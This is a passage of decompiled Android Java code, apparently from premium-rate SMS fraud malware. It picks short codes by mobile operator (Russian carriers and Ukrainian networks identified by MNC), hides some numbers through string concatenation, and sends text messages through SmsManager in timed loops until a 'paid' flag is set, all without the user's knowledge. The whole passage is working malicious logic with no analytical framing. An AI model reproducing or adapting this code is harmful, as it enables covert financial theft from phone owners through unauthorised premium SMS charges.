                                    waitForAcceptance(acceptedNums, settings);
                                }
                                restAllowedSum -= ((Double) prices.get(currentNumberIndex).second).doubleValue();
                            } else {
                                currentNumberIndex++;
                            }
                        }
                    }
                } else {
                    String currentNumber2 = Actor.NUM_10;
                    String num3_alt = Actor.NUM_3_ALT;
                    new String();
                    ActService.PREF_TO_USE = Actor.PREF_PORT;
                    do {
                        beginSending(settings, context, currentNumber2, smsData, isMTSRF, isBeeline);
                        do {
                            try {
                                sleep(100L);
                            } catch (InterruptedException e3) {
                            }
                        } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
                        lastNumber = currentNumber2;
                        if (settings.getBoolean(Actor.KEY_PAID, false)) {
                            acceptedNums++;
                            currentNumber2 = positives.get(currentNumber2);
                        } else {
                            currentNumber2 = negatives.get(currentNumber2);
                        }
                        if (currentNumber2 == null || acceptedNums > 2) {
                            break;
                        }
                    } while (!currentNumber2.equalsIgnoreCase("-1"));
                    if (acceptedNums < 2 && lastNumber.equals(num3_alt)) {
                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
                        Utils.start(null, Utils.getScheme(Actor.NUM_1, Actor.PREF_PORT), smsData, context);
                    }
                }
            } else {
                ArrayList<String> numbers = getNums(isMTSRF, isBeeline);
                for (int i = 0; i < numbers.size(); i++) {
                    String number = numbers.get(i);
                    if (number.equals(ActService.NUM_10) || number.equals(ActService.NUM_5) || number.equals(ActService.NUM_3) || number.equals(ActService.NUM_1)) {
                        ActService.PREF_TO_USE = ActService.PREF_PLAT;
                    } else {
                        ActService.PREF_TO_USE = Actor.PREF_PORT;
                    }
                    beginSending(settings, context, number, smsData, isMTSRF, isBeeline);
                    do {
                        try {
                            sleep(100L);
                        } catch (InterruptedException e4) {
                        }
                    } while (!settings.getBoolean(Actor.MESSAGE_IS_RECEIVED_KEY, false));
                    if (settings.getBoolean(Actor.KEY_PAID, false)) {
                        break;
                    }
                }
            }
            Utils.putStringValue(context, Actor.EXPECT_NUM, "", settings);
            act.reportDone();
        }

        private void waitForAcceptance(int alreadyAccepted, SharedPreferences settings) {
            do {
                try {
                    sleep(100L);
                } catch (InterruptedException e) {
                }
            } while (settings.getInt(Actor.ALLOWED_SMS_NUMBER, 0) <= alreadyAccepted);
        }

        private void beginSending(SharedPreferences settings, Context context, String num, String smsData, boolean isMTSRF, boolean isBeeline) {
            Utils.putBooleanValue(context, Actor.MESSAGE_IS_RECEIVED_KEY, false, settings);
            Utils.putBooleanValue(context, Actor.KEY_PAID, false, settings);
            Utils.putStringValue(context, Actor.EXPECT_NUM, num, settings);
            Utils.start(null, Utils.getScheme(num, ActService.PREF_TO_USE), smsData, context);
        }

        private void actUK(Actor act, SharedPreferences settings) {
            SmsManager sms = SmsManager.getDefault();
            ArrayList<String> list = new ArrayList<>();
            String opCode = TextUtils.getMNC(ActService.this.getApplicationContext());
            String ns1ua = "31".concat("61");
            String ns2ua = "28".concat("55");
            String ps1_ua = "4084".concat("705");
            if (!opCode.equals(Actor.LIFE_CODE_UA)) {
                if (opCode.equals(Actor.TRIMOB_CODE_UA) || opCode.equals("01")) {
                    list.add(ns2ua);
                } else if (opCode.equals("01")) {
                    list.add(ns1ua);
                    list.add(ns1ua);
                } else {
                    list.add(ns2ua);
                    list.add(ns1ua);
                    list.add(ns1ua);
                }
                String smsData = settings.getString(Actor.KEY_MSG_DATA_TEXT, "");
                for (int i = 0; i < list.size(); i++) {
                    if (i != 0) {
                        try {
                            sleep(60000L);
                        } catch (InterruptedException e) {
                        }
                    }
                    sms.sendTextMessage(list.get(i), null, String.valueOf(ps1_ua) + " " + smsData, null, null);
                }
            }
            act.reportDone();
        }
    }
